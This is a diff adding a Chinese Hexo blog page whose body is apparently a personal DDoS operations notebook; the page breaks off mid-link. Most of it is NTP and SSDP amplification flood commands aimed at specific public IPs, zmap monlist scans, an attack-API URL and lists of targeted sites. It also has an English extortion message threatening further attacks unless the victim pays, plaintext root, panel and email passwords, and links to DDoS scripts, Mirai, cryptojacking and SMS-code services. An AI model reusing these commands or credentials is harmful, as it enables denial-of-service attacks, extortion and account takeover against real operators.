@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="John Doe">
+
+
+
+
+
+<title>hack入门调教 | By:weizai Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">By:weizai&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">By:weizai&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">hack入门调教</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">John Doe</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">August 20, 2021&nbsp;&nbsp;18:07:21</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Hack/">Hack</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h3 id="hack入门调教"><a href="#hack入门调教" class="headerlink" title="hack入门调教"></a>hack入门调教</h3><p>扫描：<a target="_blank" rel="noopener" href="https://my.ishosting.com/en/restore">https://my.ishosting.com/en/restore</a> ip 5.45.93.56 发包： 产品名称：SJ-美国独立服务器E3-1230系列 02 系统：CentOS-7.6 64位 主IP：154.31.41.118 远程端口：32343 系统账号：root 系统密码：bAGmXQ1W0q5jftJS 高防IP分配： 内网地址分配： IP地址分配： 154.31.41.139 154.31.41.167</p>
+<p>103.164.62.159 <a target="_blank" rel="noopener" href="http://www.bfkq.cn/">http://www.bfkq.cn/</a> 外网面板地址: <a target="_blank" rel="noopener" href="http://154.31.41.118:16585/305855a0">http://154.31.41.118:16585/305855a0</a> 内网面板地址: <a target="_blank" rel="noopener" href="http://154.31.41.118:16585/305855a0">http://154.31.41.118:16585/305855a0</a> username: bbppm91i password: 2672e7d4</p>
+<p>抚摸：.&#x2F;ntp 103.100.211.198 80 ntpamp.txt 1000 -1 100 screen zmap -i eth0 -p 123 -M udp –probe-args&#x3D;file:&#x2F;home&#x2F;dd&#x2F;ntp_123_monlist.pkt -o monlist_fingerprint3.txt <a target="_blank" rel="noopener" href="https://www.shellop.com/archives/14">https://www.shellop.com/archives/14</a>  教程 <a target="_blank" rel="noopener" href="http://sj.fahezi.com/#/passport/register?agentid=1&invite=352920">http://sj.fahezi.com/#/passport/register?agentid=1&amp;invite=352920</a> <a target="_blank" rel="noopener" href="http://my15.gzkgtjy.cn/">http://my15.gzkgtjy.cn/</a> <a target="_blank" rel="noopener" href="https://daifa.suzhoutianyue.cn/newer/">https://daifa.suzhoutianyue.cn/newer/</a> <a target="_blank" rel="noopener" href="http://my15.gzkgtjy.cn/#post4">http://my15.gzkgtjy.cn/#post4</a> &#x2F;home&#x2F;ntp 120.78.142.196 80 &#x2F;home&#x2F;ntpamp.txt 1000 -1 100 不听话 &#x2F;home&#x2F;ntp 119.39.205.78 80 &#x2F;home&#x2F;ntpamp.txt 1000 -1 100  119.39.205.78</p>
+<p><a target="_blank" rel="noopener" href="http://suan.uhu0.com/">http://suan.uhu0.com/</a> 111.223.247.130 拉黑我？ 114.132.244.245 111.223.247.130 <a target="_blank" rel="noopener" href="http://baodan.taotao889.cn:10001/index.php/Home/Public/register/id/23.html">http://baodan.taotao889.cn:10001/index.php/Home/Public/register/id/23.html</a></p>
+<p>&#x2F;home&#x2F;ntp 103.216.152.178 80 &#x2F;home&#x2F;ntpamp.txt 1000 -1 100 不听话 <a target="_blank" rel="noopener" href="http://117.24.14.100:8100/frame.html?v=20230028">http://117.24.14.100:8100/frame.html?v=20230028</a> <a target="_blank" rel="noopener" href="https://f33.com.cn/#">https://f33.com.cn/#</a> <a target="_blank" rel="noopener" href="http://sotao8.cn/">http://sotao8.cn/</a> 拉黑我 <a target="_blank" rel="noopener" href="https://shop.vcfaka.cn/">https://shop.vcfaka.cn/</a> 拉黑我</p>
+<p><a target="_blank" rel="noopener" href="http://47.243.48.56:7188/">http://47.243.48.56:7188/</a></p>
+<p><a target="_blank" rel="noopener" href="https://candylab.net/design/cross-cdn-ip/">https://candylab.net/design/cross-cdn-ip/</a> <a target="_blank" rel="noopener" href="https://x.threatbook.com/">https://x.threatbook.com/</a> 反查</p>
+<p>代码<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35150992/article/details/118547659">https://blog.csdn.net/qq_35150992/article/details/118547659</a></p>
+<p>广告投放：<a target="_blank" rel="noopener" href="https://www.9797.com.cn/">https://www.9797.com.cn/</a> <a target="_blank" rel="noopener" href="https://www.9797.com.cn/">https://www.9797.com.cn/</a> <a target="_blank" rel="noopener" href="http://6381.com.cn/">http://6381.com.cn/</a></p>
+<p>cd &#x2F;home</p>
+<p>&#x2F;home&#x2F;ntp 111.223.247.131 80 &#x2F;home&#x2F;ntpamp.txt 150 -1 100 </p>
+<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/31184744">https://www.zhihu.com/question/31184744</a> cc攻击牛逼 <a target="_blank" rel="noopener" href="https://www.aeys.org/">https://www.aeys.org/</a> hack <a target="_blank" rel="noopener" href="https://www.aeys.org/thread-3578-1-1.html">https://www.aeys.org/thread-3578-1-1.html</a> <a target="_blank" rel="noopener" href="https://www.aeys.org/thread-5806-1-1.html">https://www.aeys.org/thread-5806-1-1.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.panamaserver.com/cp/clientarea.php">https://www.panamaserver.com/cp/clientarea.php</a> 新发包机 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/114818780">https://zhuanlan.zhihu.com/p/114818780</a> 靠谱 <a target="_blank" rel="noopener" href="https://www.juyifx.cn/article/296657855.html">https://www.juyifx.cn/article/296657855.html</a> 教程</p>
+<p><a target="_blank" rel="noopener" href="https://www.aeys.org/thread-3578-1-1.html">https://www.aeys.org/thread-3578-1-1.html</a> <a target="_blank" rel="noopener" href="https://www.qazyw.com/qazy/17718">https://www.qazyw.com/qazy/17718</a>  api对接</p>
+<p><a target="_blank" rel="noopener" href="http://154.31.41.118/ntp.php?key=aeys&host=103.100.211.198&port=80&time=1000&method=ntp">http://154.31.41.118/ntp.php?key=aeys&amp;host=103.100.211.198&amp;port=80&amp;time=1000&amp;method=ntp</a> <a target="_blank" rel="noopener" href="https://www.mfisp.com/help/network/1137.html">https://www.mfisp.com/help/network/1137.html</a> </p>
+<p><a target="_blank" rel="noopener" href="https://bandwagonhost.com/vps-hosting.php">https://bandwagonhost.com/vps-hosting.php</a> 试试看</p>
+<p>ddos</p>
+<p>攻击列表：<a target="_blank" rel="noopener" href="http://seller.myszt.com/admin/index/index.html">http://seller.myszt.com/admin/index/index.html</a> <a target="_blank" rel="noopener" href="http://sztadmin.myszt.com/">http://sztadmin.myszt.com/</a> <a target="_blank" rel="noopener" href="http://seller.myszt.com/">http://seller.myszt.com/</a> <a target="_blank" rel="noopener" href="https://client.myszt.com/#/login">https://client.myszt.com/#/login</a></p>
+<p>卡号：COM3 卡密：19280968337 screen zmap -i eth0 -p 123 -M udp –probe-args&#x3D;file:&#x2F;root&#x2F;ntp_123_monlist.pkt -o monlist_fingerprint.txt</p>
+<p>使用说明：<a target="_blank" rel="noopener" href="http://sms.szfangmm.com:3000/oKrYf3CeQbAjM4Sfb36Fx6">http://sms.szfangmm.com:3000/oKrYf3CeQbAjM4Sfb36Fx6</a>  手机号</p>
+<p><a target="_blank" rel="noopener" href="https://web.batchat.com/#/">https://web.batchat.com/#/</a> 蝙蝠</p>
+<p><a target="_blank" rel="noopener" href="https://site.ip138.com/myszt.com/">https://site.ip138.com/myszt.com/</a> 反查</p>
+<p><a target="_blank" rel="noopener" href="https://www.pay258.xyz/tikuan">https://www.pay258.xyz/tikuan</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.quwan.com.cn/">https://www.quwan.com.cn/</a></p>
+<p><a target="_blank" rel="noopener" href="http://suan.uhu0.com/">http://suan.uhu0.com/</a>  .&#x2F;ntp 43.139.231.101 80 ntpamp.txt 1000 -1 10000</p>
+<p>.&#x2F;ntp 120.26.101.206 80 ntpamp.txt 1000 -1 10000</p>
+<p>We have conducted security testing on your website and it is currently inaccessible. Please contact us for repairs, otherwise I will continue to attack</p>
+<p>.&#x2F;ntp 103.192.208.190 80 ntpamp.txt 1000 -1 10000 <a target="_blank" rel="noopener" href="https://hz.1md.cn/index/user/user.html">https://hz.1md.cn/index/user/user.html</a></p>
+<p><a target="_blank" rel="noopener" href="http://d.pigzbj.com/user/bascinfo.html">http://d.pigzbj.com/user/bascinfo.html</a>  2024年3月14日10:10:52 有防护</p>
+<p>.&#x2F;ntp 120.26.101.206 80 ntpamp.txt 1000 -1 10000</p>
+<p>.&#x2F;ntp 8.136.206.80 80 ntpamp.txt 1000 -1 10000</p>
+<p>.&#x2F;ntp 47.98.136.133 80 ntpamp.txt 1000 -1 10000</p>
+<p>.&#x2F;ntp 104.218.234.93 80 ntpamp.txt 1000 -1 10000</p>
+<p>.&#x2F;ntp 104.218.234.93 80 ntpamp.txt 1000 -1 10000. .&#x2F;ntp 125.77.158.84 80 ntpamp.txt 1000 -1 10000</p>
+<p>.&#x2F;ntp 103.40.13.154 80 ntpamp.txt 1000 -1 10000</p>
+<p>.&#x2F;ntp 103.192.208.190 80 ntpamp.txt 1000 -1 10000 .&#x2F;ntp 47.98.136.133 80 ntpamp.txt 1000 -1 10000</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Nolovenodie/ssdp-zmap">https://github.com/Nolovenodie/ssdp-zmap</a>  ssdp</p>
+<p>.&#x2F;ssdp 43.228.71.186 80 &#x2F;home&#x2F;ntpamp.txt 1000</p>
+<p>.&#x2F;ntp 123.129.241.15 80 ntpamp.txt 1000 -1 10000</p>
+<p>&#x2F;home&#x2F;ssdp&#x2F;ssdp-zmap-main&#x2F;ssdp 43.228.71.186 80 &#x2F;home&#x2F;ntpamp.txt 1000</p>
+<p>.&#x2F;ssdp 43.139.231.101 80 &#x2F;home&#x2F;ntpamp.txt 1000</p>
+<p>.&#x2F;ntp 43.228.71.186 80 ntpamp.txt 1000 -1 10000</p>
+<p>.&#x2F;ntp 23.225.192.35 80 ntpamp.txt 1000 -1 10000</p>
+<p>.&#x2F;ntp 123.129.198.114 80 ntpamp.txt 1000 -1 10000</p>
+<p>121.41.50.150</p>
+<p>x .&#x2F;ntp 106.75.30.138 80 ntpamp.txt 1000 -1 10000</p>
+<p>.&#x2F;ntp 103.120.80.30 1612 ntpamp.txt 1000 -1 10000 .&#x2F;ntp 8.138.86.218 80 ntpamp.txt 1000 -1 10000</p>
+<p>.&#x2F;ntp 103.8.222.225 80 ntpamp.txt 1000 -1 10000 .&#x2F;ntp 45.251.8.70 80 ntpamp.txt 1000 -1 10000</p>
+<p>.&#x2F;ntp 103.8.222.225 80 ntpamp.txt 1000 -1 10000</p>
+<p>.&#x2F;ntp 32.397 119.436 80 ntpamp.txt 1000 -1 10000</p>
+<p>.&#x2F;ntp 32.397 119.436 80 ntpamp.txt 1000 -1 10000</p>
+<p>.&#x2F;ntp 154.91.255.148 80 ntpamp.txt 1000 -1 10000</p>
+<p>.&#x2F;ntp 8.138.86.218 80 ntpamp.txt 1000 -1 10000</p>
+<p>.&#x2F;ntp 8.138.86.218 80 ntpamp.txt 1000 -1 10000</p>
+<p>.&#x2F;ntp 45.195.55.51 80 ntpamp.txt 1000 -1 10000</p>
+<p>.&#x2F;ntp 220.185.183.212 80 ntpamp.txt 1000 -1 10000</p>
+<p>45.251.8.70,123.129.224.113,103.8.222.225</p>
+<p>.&#x2F;ntp 123.129.226.92 80 ntpamp.txt 1000 -1 10000</p>
+<p>103.139.1.191</p>
+<p><a target="_blank" rel="noopener" href="http://www.jimeimadou.com/">www.jimeimadou.com</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.anxtao.com:81/index.php/Home/Public/login.html">http://www.anxtao.com:81/index.php/Home/Public/login.html</a>  拉黑我  微信 anxintao7788</p>
+<p><a target="_blank" rel="noopener" href="https://www.xiaobeitian.com/member_center/index.html">https://www.xiaobeitian.com/member_center/index.html</a> 两个微信</p>
+<p><a target="_blank" rel="noopener" href="http://sj.shenren888.com/member/home">http://sj.shenren888.com/member/home</a>  AA智选财富</p>
+<p><a target="_blank" rel="noopener" href="http://106.75.30.138:8080/merchant/#/">http://106.75.30.138:8080/merchant/#/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.shellop.com/archives/14">https://www.shellop.com/archives/14</a>  教程</p>
+<p><a target="_blank" rel="noopener" href="https://www.shangjia360.com/">https://www.shangjia360.com/</a> 导航 <a target="_blank" rel="noopener" href="https://pt.shangjia360.com/">https://pt.shangjia360.com/</a> <a target="_blank" rel="noopener" href="https://www.dstat.cc/l4nonprotected?id=FDCservers-1">https://www.dstat.cc/l4nonprotected?id=FDCservers-1</a>  防御姿态</p>
+<p>cd &#x2F;home;.&#x2F;ntp 43.141.69.245 80 &#x2F;home&#x2F;ntpamp.txt 2 -1 1000</p>
+<p><a target="_blank" rel="noopener" href="https://1024.day/d/2555">https://1024.day/d/2555</a> cc攻击</p>
+<p><a target="_blank" rel="noopener" href="https://www.w643.com/cydz/2020-08-19/668.html">https://www.w643.com/cydz/2020-08-19/668.html</a>  zmap 探针</p>
+<p><a target="_blank" rel="noopener" href="https://www.ipip.net/ip.html">https://www.ipip.net/ip.html</a>  查询 <a target="_blank" rel="noopener" href="https://search.arin.net/rdap/?query=103.100.211.198">https://search.arin.net/rdap/?query=103.100.211.198</a> <a target="_blank" rel="noopener" href="https://ipwhois.cnnic.cn/bns/query/Query/ipwhoisQuery.do?queryOption=ipv4&txtquery=198.12.70.119">https://ipwhois.cnnic.cn/bns/query/Query/ipwhoisQuery.do?queryOption=ipv4&amp;txtquery=198.12.70.119</a> <a target="_blank" rel="noopener" href="https://tool.chinaz.com/ipWhois/?q=198.12.70.119">https://tool.chinaz.com/ipWhois/?q=198.12.70.119</a></p>
+<p>鱼儿列表</p>
+<p><a target="_blank" rel="noopener" href="http://www.548wg.cn/">http://www.548wg.cn/</a>   qq群：3226686009</p>
+<p><a target="_blank" rel="noopener" href="http://www.jisudama.com/">http://www.jisudama.com/</a>  qq:124627547</p>
+<p><a target="_blank" rel="noopener" href="http://www.douyzf.com/">http://www.douyzf.com/</a>  <a target="_blank" rel="noopener" href="http://seeo.doushuawang.cn/indexPc.html#/">http://seeo.doushuawang.cn/indexPc.html#/</a>  qq :2571391329</p>
+<p><a target="_blank" rel="noopener" href="http://www.002gm.com/">www.002gm.com</a> qq 493141393  有事请加微信 qfcq168</p>
+<p>.&#x2F;ntp 154.211.22.85 80 ntpamp.txt 1000 -1 100</p>
+<p><a target="_blank" rel="noopener" href="http://85.206.161.210/user/register.aspx">http://85.206.161.210/user/register.aspx</a></p>
+<p>hack进阶 sudo dpkg-reconfigure locales  kali中文</p>
+<p><a target="_blank" rel="noopener" href="https://blog.nsfocus.net/luoyefeihua/">https://blog.nsfocus.net/luoyefeihua/</a>  落叶飞花</p>
+<p><a target="_blank" rel="noopener" href="https://space.bilibili.com/2043757290">https://space.bilibili.com/2043757290</a> 云溪</p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1G94y1M7Q9/?spm_id_from=333.337.search-card.all.click&vd_source=09c378d5b1716fa19f2d2471f10b943d">https://www.bilibili.com/video/BV1G94y1M7Q9/?spm_id_from=333.337.search-card.all.click&amp;vd_source=09c378d5b1716fa19f2d2471f10b943d</a>  syn</p>
+<p><a target="_blank" rel="noopener" href="https://www.kuaidaili.com/free/intr/">https://www.kuaidaili.com/free/intr/</a> 代理 </p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1VM411k78U/?spm_id_from=333.337.search-card.all.click&vd_source=09c378d5b1716fa19f2d2471f10b943d">https://www.bilibili.com/video/BV1VM411k78U/?spm_id_from=333.337.search-card.all.click&amp;vd_source=09c378d5b1716fa19f2d2471f10b943d</a> 远控</p>
+<p>GitHub搜索mirai，最近的DDoS据说就是这个开源软件找的肉鸡</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Homeless-Xu/HomeLess-HomeLAB/blob/master/%E2%97%BC%EF%B8%8E0-1993/90-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D.txt">https://github.com/Homeless-Xu/HomeLess-HomeLAB/blob/master/%E2%97%BC%EF%B8%8E0-1993/90-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D.txt</a>  客户必胜所学</p>
+<p>钟馗之眼</p>
+<p>资源搜索引擎</p>
+<p>发包机：上行网速1g 支持ip伪装 支持伪造数据包发送</p>
+<p><a target="_blank" rel="noopener" href="https://hostloc.com/thread-1171536-1-1.html">https://hostloc.com/thread-1171536-1-1.html</a> 主机交流</p>
+<p><a target="_blank" rel="noopener" href="https://odysee.com/$/search?q=ddos">https://odysee.com/$/search?q=ddos</a> 视频站  维基百科 papaq.xyz</p>
+<p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=oWSsVYvsSr0">https://www.youtube.com/watch?v=oWSsVYvsSr0</a>  黑产话术</p>
+<p><a target="_blank" rel="noopener" href="https://swapp3r.ru/pricing.php">https://swapp3r.ru/pricing.php</a>  加密劫持计划</p>
+<p>fastdfs搭建</p>
+<p><a target="_blank" rel="noopener" href="https://bfd2018.github.io/2022/05/28/fastdfs/#%E4%B8%89%E3%80%81%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F-FastDFS-%E7%9A%84-HTTP-%E8%AE%BF%E9%97%AE">https://bfd2018.github.io/2022/05/28/fastdfs/#%E4%B8%89%E3%80%81%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F-FastDFS-%E7%9A%84-HTTP-%E8%AE%BF%E9%97%AE</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1RR4y1L7xf/?spm_id_from=333.337.search-card.all.click&vd_source=09c378d5b1716fa19f2d2471f10b943d">https://www.bilibili.com/video/BV1RR4y1L7xf/?spm_id_from=333.337.search-card.all.click&amp;vd_source=09c378d5b1716fa19f2d2471f10b943d</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mmzs/p/12090197.html">https://www.cnblogs.com/mmzs/p/12090197.html</a></p>
+<p>docker run -dti –network&#x3D;host –name tracker -v &#x2F;home&#x2F;fdfs&#x2F;tracker:&#x2F;home&#x2F;fdfs -v &#x2F;home&#x2F;localtime:&#x2F;home&#x2F;localtime delron&#x2F;fastdfs tracker</p>
+<p>137.220.134.130:22122 </p>
+<p>docker run -dti  –network&#x3D;host –name storage -e TRACKER_SERVER&#x3D;137.220.134.130:22122 -v &#x2F;var&#x2F;fdfs&#x2F;storage:&#x2F;var&#x2F;fdfs  -v &#x2F;etc&#x2F;localtime:&#x2F;etc&#x2F;localtime  delron&#x2F;fastdfs storage</p>
+<p>docker run -dti  –network&#x3D;host –name storage -e TRACKER_SERVER&#x3D;137.220.134.130:22122  -v &#x2F;home&#x2F;fdfs&#x2F;storage:&#x2F;home&#x2F;fdfs  -v &#x2F;home&#x2F;localtime:&#x2F;home&#x2F;localtime  delron&#x2F;fastdfs storage</p>
+<p>docker run -dti  –network&#x3D;host –name storage -e TRACKER_SERVER&#x3D;137.220.134.130:22122 -v &#x2F;home&#x2F;fdfs&#x2F;storage:&#x2F;home&#x2F;fdfs  -v &#x2F;home&#x2F;localtime:&#x2F;home&#x2F;localtime  delron&#x2F;fastdfs storage</p>
+<p>&#x2F;home&#x2F;fdfs&#x2F;storage</p>
+<p>反射</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/autopwn/p/14694229.html">https://www.cnblogs.com/autopwn/p/14694229.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/thom-s/7b3fcdcb88c0670167ccdd6ebca3c924">https://gist.github.com/thom-s/7b3fcdcb88c0670167ccdd6ebca3c924</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Srar/MemcacheDos">https://github.com/Srar/MemcacheDos</a>  memc</p>
+<p><a target="_blank" rel="noopener" href="https://www.aeys.org/thread-3511-1-1.html">https://www.aeys.org/thread-3511-1-1.html</a> 所有脚本</p>
+<p><a target="_blank" rel="noopener" href="https://www.w643.com/cydz/2020-08-19/669.html">https://www.w643.com/cydz/2020-08-19/669.html</a> 阿虎</p>
+<p><a target="_blank" rel="noopener" href="https://www.chabug.org/tools/367">https://www.chabug.org/tools/367</a></p>
+<p><a target="_blank" rel="noopener" href="https://lmziyuan.com/1442.html">https://lmziyuan.com/1442.html</a></p>
+<p>bbs.kenaisq.top</p>
+<p>快捷键</p>
+<p>Ctrl + Alt + M  提取方法并生成</p>
+<p>shift+f9 快速断点</p>
+<p>Ctrl + E  最近打开文件</p>
+<p>ALT+X  DBeaver 执行多条sql  </p>
+<p>账号：    <a href="mailto:&#65;&#117;&#x72;&#111;&#114;&#x65;&#x59;&#x6f;&#110;&#x65;&#x6f;&#107;&#97;&#x40;&#109;&#97;&#x69;&#108;&#46;&#99;&#111;&#x6d;">&#65;&#117;&#x72;&#111;&#114;&#x65;&#x59;&#x6f;&#110;&#x65;&#x6f;&#107;&#97;&#x40;&#109;&#97;&#x69;&#108;&#46;&#99;&#111;&#x6d;</a>    密码：    J1FN@?!5u@o90Sku</p>
+<p>linux</p>
+<p>grep “用户名” 日志文件名 | sort -k2,2<br>ps:假设你的日志文件中包含时间戳并使用以下格式：<br>[YYYY-MM-DD HH:MM:SS]，你可以使用以下命令按时间顺序查询<br>一个人的操作日志</p>
+<p>history 查询执行的历史记录</p>
+<p>screen -ls 查看<br>screen -d 退出<br>screen -r id 恢复到 视图</p>
+<p><a target="_blank" rel="noopener" href="https://www.shellop.com/archives/14">https://www.shellop.com/archives/14</a> </p>
+<p>cat catalina.out|awk ‘&#x2F;error&#x2F;&amp;&amp;&#x2F;main&#x2F;‘    ps:用于多条件查询日志</p>
+<p>挂机</p>
+<p>154.209.4.129</p>
+<p>接码</p>
+<p><a target="_blank" rel="noopener" href="https://psslk.org/sifangsms">https://psslk.org/sifangsms</a></p>
+<p><a target="_blank" rel="noopener" href="https://psslk.org/oinchatmS0dcxruyXDT23134">https://psslk.org/oinchatmS0dcxruyXDT23134</a> <a target="_blank" rel="noopener" href="https://psslk.org/yeziyun22">https://psslk.org/yeziyun22</a> <a target="_blank" rel="noopener" href="https://psslk.org/joinchat/nyX5vQOD-7GUojMncdOmeQ">https://psslk.org/joinchat/nyX5vQOD-7GUojMncdOmeQ</a></p>
+<p><a target="_blank" rel="noopener" href="https://psslk.org/etyrrt">https://psslk.org/etyrrt</a> <a target="_blank" rel="noopener" href="https://psslk.org/haozhuma">https://psslk.org/haozhuma</a> @sms104</p>
+<p><a target="_blank" rel="noopener" href="https://psslk.org/ptjlq">https://psslk.org/ptjlq</a> <a target="_blank" rel="noopener" href="https://psslk.org/lanmapt">https://psslk.org/lanmapt</a> <a target="_blank" rel="noopener" href="https://psslk.org/kashangjiema6">https://psslk.org/kashangjiema6</a></p>
+<p><a target="_blank" rel="noopener" href="https://ptdy.org/sifangsms">https://ptdy.org/sifangsms</a> <a target="_blank" rel="noopener" href="https://ptdy.org/joinchat/8FMI_VuIYACgWZK6PYd53A">https://ptdy.org/joinchat/8FMI_VuIYACgWZK6PYd53A</a> <a target="_blank" rel="noopener" href="https://ptdy.org/oinchatmS0dcxruyXDT23134">https://ptdy.org/oinchatmS0dcxruyXDT23134</a> <a target="_blank" rel="noopener" href="https://ptdy.org/yeziyun22">https://ptdy.org/yeziyun22</a> <a target="_blank" rel="noopener" href="https://ptdy.org/joinchat/nyX5vQOD-7GUojMncdOmeQ">https://ptdy.org/joinchat/nyX5vQOD-7GUojMncdOmeQ</a> <a target="_blank" rel="noopener" href="https://ptdy.org/etyrrt">https://ptdy.org/etyrrt</a> <a target="_blank" rel="noopener" href="https://ptdy.org/haozhuma">https://ptdy.org/haozhuma</a> @sms104 <a target="_blank" rel="noopener" href="https://ptdy.org/lanmapt">https://ptdy.org/lanmapt</a> <a target="_blank" rel="noopener" href="https://ptdy.org/mamahuhu">https://ptdy.org/mamahuhu</a> <a target="_blank" rel="noopener" href="https://ptdy.org/kashangjiaoliu">https://ptdy.org/kashangjiaoliu</a> <a target="_blank" rel="noopener" href="https://ptdy.org/tomjiema">https://ptdy.org/tomjiema</a></p>
+<p>–待验证 <a target="_blank" rel="noopener" href="https://ptdy.org/jiemayun011">https://ptdy.org/jiemayun011</a> <a target="_blank" rel="noopener" href="https://ptdy.org/jiema00126">https://ptdy.org/jiema00126</a> <a target="_blank" rel="noopener" href="https://ptdy.org/jiemayun0112">https://ptdy.org/jiemayun0112</a> <a target="_blank" rel="noopener" href="https://ptdy.org/jiemayun017">https://ptdy.org/jiemayun017</a> <a target="_blank" rel="noopener" href="https://ptdy.org/jiemayun019">https://ptdy.org/jiemayun019</a> <a target="_blank" rel="noopener" href="https://ptdy.org/jiemayun00141">https://ptdy.org/jiemayun00141</a> <a target="_blank" rel="noopener" href="https://ptdy.org/jiemayun0114">https://ptdy.org/jiemayun0114</a> <a target="_blank" rel="noopener" href="https://ptdy.org/jiemayun0111">https://ptdy.org/jiemayun0111</a> <a target="_blank" rel="noopener" href="https://ptdy.org/jiemayun018">https://ptdy.org/jiemayun018</a> <a target="_blank" rel="noopener" href="https://ptdy.org/jiemayun014">https://ptdy.org/jiemayun014</a> <a target="_blank" rel="noopener" href="https://ptdy.org/ptjlq">https://ptdy.org/ptjlq</a> <a 